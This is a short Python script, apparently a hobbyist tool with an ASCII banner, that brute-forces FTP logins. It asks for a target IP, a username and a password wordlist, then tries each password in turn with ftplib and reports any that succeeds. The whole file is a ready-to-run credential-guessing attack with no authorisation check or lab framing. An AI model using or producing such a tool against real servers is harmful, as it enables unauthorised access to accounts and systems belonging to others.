import ftplib
import time
import os

# Terminali temizle
os.system("clear")

# ASCII banner
print(r"""
  ___                           
 | _ ) __ _ _ _  __ _ _ _  __ _ 
 | _ \/ _` | ' \/ _` | ' \/ _` |
 |___/\__,_|_||_\__,_|_||_\__,_|
                                  
""")

print("🔒 Target IP:")
target = input("> ")

print("👤 FTP username (leave blank for 'anonymous'):")
username = input("> ").strip()
if username == "":
    username = "anonymous"

print("📁 Password list file (example: passlist.txt):")
wordlist_path = input("> ").strip()

try:
    with open(wordlist_path, "r", encoding="latin-1") as file:
        passwords = file.readlines()
except FileNotFoundError:
    print("❌ Password list not found.")
    exit()

os.system("clear")
print(f"\n🚀 Starting FTP brute-force on {target} as {username}...\n")

for password in passwords:
    password = password.strip()
    print(f"🔍 Trying password: {password}")
    try:
        ftp = ftplib.FTP(target)
        ftp.login(user=username, passwd=password)
        print(f"\n✅ Success! Password found: {password}")
        ftp.quit()
        break
    except ftplib.error_perm:
        print("❌ Login failed")
    except Exception as e:
        print("⚠️ Error:", e)
        break
    time.sleep(0.1)

else:
    print("\n🔚 Done. No password matched.")
